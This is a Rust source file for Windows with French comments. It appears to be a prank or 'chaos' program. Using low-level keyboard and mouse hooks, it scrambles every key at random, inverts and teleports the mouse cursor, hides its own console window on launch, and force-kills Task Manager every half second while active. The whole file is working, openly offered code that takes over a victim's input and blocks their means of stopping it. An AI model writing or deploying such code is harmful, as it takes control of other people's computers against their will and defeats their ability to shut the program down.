#![allow(unsafe_op_in_unsafe_fn)]

use once_cell::sync::Lazy;
use rand::{Rng, seq::SliceRandom};
use std::collections::HashMap;
use std::process::Command;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::RwLock;
use std::thread;
use std::time::Duration;
use windows::Win32::Foundation::*;
use windows::Win32::System::Console::*;
use windows::Win32::UI::Input::KeyboardAndMouse::*;
use windows::Win32::UI::WindowsAndMessaging::*;

/// ───── États globaux ──────────────────────────────────────────────
static ACTIVE:    AtomicBool  = AtomicBool::new(false);
static DOWN_HELD: AtomicBool  = AtomicBool::new(false);
static MOVE_ID:   AtomicUsize = AtomicUsize::new(0);

static LAST_POS: Lazy<RwLock<POINT>> =
    Lazy::new(|| RwLock::new(POINT { x: 0, y: 0 }));

static KEY_MAP: Lazy<RwLock<HashMap<u8, u8>>> =
    Lazy::new(|| RwLock::new(HashMap::new()));

/// ───── Hook clavier ───────────────────────────────────────────────
unsafe extern "system" fn keyboard_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code == HC_ACTION as i32 {
        let kbd  = &*(l_param.0 as *const KBDLLHOOKSTRUCT);
        let vk   = kbd.vkCode as u8;
        let down = matches!(w_param.0 as u32, WM_KEYDOWN | WM_SYSKEYDOWN);

        if vk == VK_NEXT.0 as u8 {
            if down && !DOWN_HELD.load(Ordering::Relaxed) {
                DOWN_HELD.store(true, Ordering::Relaxed);
                let now = !ACTIVE.load(Ordering::Relaxed);
                ACTIVE.store(now, Ordering::Relaxed);

                if now {
                    rebuild_mapping();
                } else {
                    send_all_keyups();
                }
                return LRESULT(1);
            } else if !down {
                DOWN_HELD.store(false, Ordering::Relaxed);
                return LRESULT(1);
            }
        }

        if ACTIVE.load(Ordering::Relaxed) {
            if let Some(&new_vk) = KEY_MAP.read().unwrap().get(&vk) {
                send_key(new_vk, down);
                return LRESULT(1);
            }
        }
    }
    CallNextHookEx(HHOOK(0), n_code, w_param, l_param)
}

/// ───── Hook souris ────────────────────────────────────────────────
unsafe extern "system" fn mouse_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code == HC_ACTION as i32 && ACTIVE.load(Ordering::Relaxed) {
        let ms = &*(l_param.0 as *const MSLLHOOKSTRUCT);

        if ms.flags & LLMHF_INJECTED as u32 != 0 {
            return CallNextHookEx(HHOOK(0), n_code, w_param, l_param);
        }

        if w_param.0 as u32 == WM_MOUSEMOVE {
            invert_delta(ms.pt);

            let id = MOVE_ID.fetch_add(1, Ordering::Relaxed);
            thread::spawn(move || {
                thread::sleep(Duration::from_secs(2));
                if id == MOVE_ID.load(Ordering::Relaxed) && ACTIVE.load(Ordering::Relaxed) {
                    teleport_random();
                }
            });

            return LRESULT(1);
        }
    }
    CallNextHookEx(HHOOK(0), n_code, w_param, l_param)
}

/// ───── Inversion de la direction de la souris ─────────────────────
fn invert_delta(current: POINT) {
    let (dx, dy) = {
        let mut last = LAST_POS.write().unwrap();
        let dx = current.x - last.x;
        let dy = current.y - last.y;
        *last = current;
        (-dx, -dy)
    };

    if dx == 0 && dy == 0 { return; }

    unsafe {
        let mut inp = INPUT::default();
        inp.r#type = INPUT_MOUSE;
        inp.Anonymous.mi.dx = dx;
        inp.Anonymous.mi.dy = dy;
        inp.Anonymous.mi.dwFlags = MOUSEEVENTF_MOVE;
        SendInput(&[inp], std::mem::size_of::<INPUT>() as i32);
    }
}

/// ───── Téléportation souris aléatoire ─────────────────────────────
fn teleport_random() {
    let (w, h) = screen_size();
    let mut rng = rand::thread_rng();
    let x_abs = (rng.gen_range(0..w) * 65535 / (w - 1)) as i32;
    let y_abs = (rng.gen_range(0..h) * 65535 / (h - 1)) as i32;

    unsafe {
        let mut inp = INPUT::default();
        inp.r#type = INPUT_MOUSE;
        inp.Anonymous.mi.dx = x_abs;
        inp.Anonymous.mi.dy = y_abs;
        inp.Anonymous.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
        SendInput(&[inp], std::mem::size_of::<INPUT>() as i32);
    }
}

/// ───── Clavier : mapping et envoi ─────────────────────────────────
fn rebuild_mapping() {
    let keys: Vec<u8> = (0x01..=0xFE).filter(|&k| k != VK_NEXT.0 as u8).collect();
    let mut shuffled = keys.clone();
    shuffled.shuffle(&mut rand::thread_rng());

    let mut map = KEY_MAP.write().unwrap();
    map.clear();
    for (src, dst) in keys.into_iter().zip(shuffled.into_iter()) {
        map.insert(src, dst);
    }
}

fn send_key(vk: u8, down: bool) {
    unsafe {
        let mut inp = INPUT::default();
        inp.r#type = INPUT_KEYBOARD;
        inp.Anonymous.ki.wVk = VIRTUAL_KEY(vk as u16);
        if !down {
            inp.Anonymous.ki.dwFlags = KEYEVENTF_KEYUP;
        }
        SendInput(&[inp], std::mem::size_of::<INPUT>() as i32);
    }
}

fn send_all_keyups() {
    for vk in 0x01u8..=0xFE {
        unsafe {
            let mut inp = INPUT::default();
            inp.r#type = INPUT_KEYBOARD;
            inp.Anonymous.ki.wVk = VIRTUAL_KEY(vk as u16);
            inp.Anonymous.ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(&[inp], std::mem::size_of::<INPUT>() as i32);
        }
    }
}

/// ───── Divers ─────────────────────────────────────────────────────
fn screen_size() -> (i32, i32) {
    unsafe {
        (
            GetSystemMetrics(SM_CXSCREEN),
            GetSystemMetrics(SM_CYSCREEN),
        )
    }
}

/// ───── Interruption console ───────────────────────────────────────
unsafe extern "system" fn console_handler(ctrl: u32) -> BOOL {
    if ctrl == CTRL_C_EVENT || ctrl == CTRL_CLOSE_EVENT {
        ACTIVE.store(false, Ordering::Relaxed);
        send_all_keyups();
    }
    BOOL(0)
}

/// ───── Surveillance Taskmgr ───────────────────────────────────────
fn monitor_task_manager() {
    thread::spawn(|| {
        loop {
            // Vérifie si le mode chaos est activé
            if ACTIVE.load(Ordering::Relaxed) {
                let output = Command::new("tasklist")
                    .output()
                    .expect("failed to execute tasklist");

                let list = String::from_utf8_lossy(&output.stdout).to_lowercase();

                if list.contains("taskmgr.exe") {
                    let _ = Command::new("taskkill")
                        .args(["/IM", "Taskmgr.exe", "/F"])
                        .output();
                }
            }

            thread::sleep(Duration::from_millis(500)); // plus réactif
        }
    });
}

/// ───── Entrée principale ──────────────────────────────────────────
fn main() {
    unsafe {
        SetConsoleCtrlHandler(Some(console_handler), TRUE).ok();
        ShowWindow(GetConsoleWindow(), SW_HIDE); // ← cache la console au démarrage
    }

    monitor_task_manager();

    let k_hook = unsafe {
        SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), HINSTANCE::default(), 0)
            .expect("hook clavier KO")
    };
    let m_hook = unsafe {
        SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_proc), HINSTANCE::default(), 0)
            .expect("hook souris KO")
    };

    let mut msg = MSG::default();
    while unsafe { GetMessageW(&mut msg, HWND(0), 0, 0) }.into() {
        unsafe { TranslateMessage(&msg); DispatchMessageW(&msg); }
    }

    unsafe {
        UnhookWindowsHookEx(k_hook).ok();
        UnhookWindowsHookEx(m_hook).ok();
    }
}
